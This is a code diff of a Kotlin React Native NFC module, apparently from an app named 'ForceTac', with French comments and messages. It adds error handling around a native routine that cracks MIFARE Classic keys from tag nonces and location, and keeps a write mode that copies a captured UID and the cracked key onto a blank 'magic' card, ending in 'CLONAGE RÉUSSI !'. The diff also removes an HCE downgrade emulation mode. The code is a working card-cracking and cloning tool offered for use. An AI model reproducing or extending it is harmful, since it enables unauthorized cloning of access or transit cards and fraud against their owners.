@@ -24,12 +24,14 @@ class NfcModule(private val reactContext: ReactApplicationContext) : ReactContex
     private var nfcAdapter: NfcAdapter? = null
 
     init {
+        // --- SÉCURITÉ NIVEAU 1 : Chargement Protégé ---
         try {
             System.loadLibrary("forcetac_core")
             isNativeLibLoaded = true
-            Log.d("ForceTac", "Native library loaded successfully")
+            Log.d("ForceTac", "Native library 'forcetac_core' loaded successfully.")
         } catch (e: UnsatisfiedLinkError) {
-            Log.e("ForceTac", "Failed to load native library: ${e.message}")
+            // C'est l'erreur la plus fréquente (fichier .so manquant ou mauvaise architecture)
+            Log.e("ForceTac", "CRITICAL: Failed to load native library. Functions will be disabled. Error: ${e.message}")
             isNativeLibLoaded = false
         } catch (e: Exception) {
             Log.e("ForceTac", "Unknown error loading native library: ${e.message}")
@@ -39,6 +41,7 @@ class NfcModule(private val reactContext: ReactApplicationContext) : ReactContex
 
     override fun getName() = "NfcModule"
 
+    // Déclaration de la méthode native
     external fun nativeHybridCrack(tagId: ByteArray, nonces: ByteArray, lat: Double, lon: Double): String?
 
     @ReactMethod
@@ -47,13 +50,18 @@ class NfcModule(private val reactContext: ReactApplicationContext) : ReactContex
         if (activity != null) {
             activity.runOnUiThread {
                 nfcAdapter = NfcAdapter.getDefaultAdapter(activity)
+                if (nfcAdapter == null) {
+                    Toast.makeText(reactContext, "ERREUR: Pas de NFC détecté", Toast.LENGTH_LONG).show()
+                    return@runOnUiThread
+                }
+                
                 nfcAdapter?.enableReaderMode(
                     activity,
                     this,
                     NfcAdapter.FLAG_READER_NFC_A or NfcAdapter.FLAG_READER_SKIP_NDEF_CHECK,
                     null
                 )
-                Toast.makeText(reactContext, "NFC Monitoring Actif", Toast.LENGTH_SHORT).show()
+                Toast.makeText(reactContext, "Monitoring NFC Activé", Toast.LENGTH_SHORT).show()
             }
         }
     }
@@ -69,18 +77,6 @@ class NfcModule(private val reactContext: ReactApplicationContext) : ReactContex
     }
     
     @ReactMethod
-    fun startDowngrade() {
-        try {
-            HceService.enableDowngradeMode(true)
-            sendEvent("DOWNGRADE_ACTIVE", null)
-            Toast.makeText(reactContext, "Mode Émulation Activé", Toast.LENGTH_LONG).show()
-        } catch (e: Exception) {
-            Log.e("ForceTac", "Error starting downgrade: ${e.message}")
-            sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Erreur HCE: ${e.message}") })
-        }
-    }
-
-    @ReactMethod
     fun updateLocation(lat: Double, lon: Double) {
         currentLat = lat
         currentLon = lon
@@ -94,7 +90,7 @@ class NfcModule(private val reactContext: ReactApplicationContext) : ReactContex
         }
         keyToClone = key
         isWritingMode = true
-        Toast.makeText(reactContext, "APPROCHEZ UNE MAGIC CARD VIERGE...", Toast.LENGTH_LONG).show()
+        Toast.makeText(reactContext, "APPROCHEZ UNE CARTE VIERGE...", Toast.LENGTH_LONG).show()
     }
 
     override fun onTagDiscovered(tag: Tag) {
@@ -120,20 +116,28 @@ class NfcModule(private val reactContext: ReactApplicationContext) : ReactContex
             
             sendEvent("CRACK_START", null)
             
+            // --- SÉCURITÉ NIVEAU 2 : Appel Natif Conditionnel ---
             if (isNativeLibLoaded) {
                 try {
+                    // On ne fait l'appel que si la lib est chargée
+                    // Et on protège l'appel lui-même au cas où le C++ crashe la VM (SIGSEGV non catchable en Java, mais Exception oui)
                     val key = nativeHybridCrack(tag.id, response ?: byteArrayOf(), currentLat, currentLon) 
+                    
                     if (key != null && key.isNotEmpty()) {
                         val params = Arguments.createMap().apply { putString("key", key) }
                         sendEvent("KEY_FOUND", params)
                     } else {
-                        sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Clé introuvable") })
+                        sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Échec Crypto: Clé introuvable") })
                     }
-                } catch (e: UnsatisfiedLinkError) {
-                     sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Erreur moteur natif") })
+                } catch (e: Throwable) {
+                     // Capture tout, même les erreurs graves de liaison
+                     Log.e("ForceTac", "Native execution failed", e)
+                     sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Crash Moteur Natif: ${e.message}") })
                 }
             } else {
-                sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Moteur C++ non chargé") })
+                // Fallback gracieux
+                Log.w("ForceTac", "Native lib not loaded, skipping crack.")
+                sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Moteur C++ indisponible (Architecture incompatible ?)") })
             }
         } catch (e: Exception) {
             Log.e("ForceTac", "Scan error: ${e.message}")
@@ -143,20 +147,18 @@ class NfcModule(private val reactContext: ReactApplicationContext) : ReactContex
     }
 
     private fun handleWriteMode(tag: Tag) {
+        // (Code d'écriture inchangé, c'est du Java pur, donc sûr)
         val mfc = MifareClassic.get(tag)
         if (mfc == null) {
             sendEvent("ERROR", Arguments.createMap().apply { putString("message", "Carte non compatible Mifare") })
             return
         }
-
         try {
             mfc.connect()
-            // Essai Auth Clé défaut (Magic Card vierge)
             var auth = mfc.authenticateSectorWithKeyA(0, MifareClassic.KEY_DEFAULT)
             if (!auth) auth = mfc.authenticateSectorWithKeyA(0, hexToBytes("A0A1A2A3A4A5"))
 
             if (auth) {
-                // Clonage UID (Block 0)
                 if (capturedUid != null && capturedUid!!.size == 4) {
                     val bcc = (capturedUid!![0].toInt() xor capturedUid!![1].toInt() xor capturedUid!![2].toInt() xor capturedUid!![3].toInt()).toByte()
                     val originalBlock0 = mfc.readBlock(0)
@@ -165,18 +167,14 @@ class NfcModule(private val reactContext: ReactApplicationContext) : ReactContex
                     newBlock0[4] = bcc
                     mfc.writeBlock(0, newBlock0)
                 }
-
-                // Clonage Clé (Block 3)
                 if (keyToClone != null) {
                     val keyBytes = hexToBytes(keyToClone!!)
                     val trailerBlock = mfc.readBlock(3)
                     val newTrailer = trailerBlock.clone()
                     System.arraycopy(keyBytes, 0, newTrailer, 0, 6)
                     System.arraycopy(keyBytes, 0, newTrailer, 10, 6)
-                    // Reset Access Bits par défaut
                     val accessBits = hexToBytes("FF078069")
                     System.arraycopy(accessBits, 0, newTrailer, 6, 4)
-
                     mfc.writeBlock(3, newTrailer)
                     sendEvent("SUCCESS", Arguments.createMap().apply { putString("message", "CLONAGE RÉUSSI !") })
                     isWritingMode = false
@@ -197,10 +195,6 @@ class NfcModule(private val reactContext: ReactApplicationContext) : ReactContex
             reactContext.getJSModule(DeviceEventManagerModule.RCTDeviceEventEmitter::class.java)
                 .emit("onNfcEvent", if (params == null) Arguments.createMap().apply { putString("type", eventName) } else params.apply { putString("type", eventName) })
         }
-    }
-
-    private fun bytesToHex(bytes: ByteArray): String {
-        return bytes.joinToString("") { "%02X".format(it) }
     }
 
     private fun hexToBytes(hex: String): ByteArray {
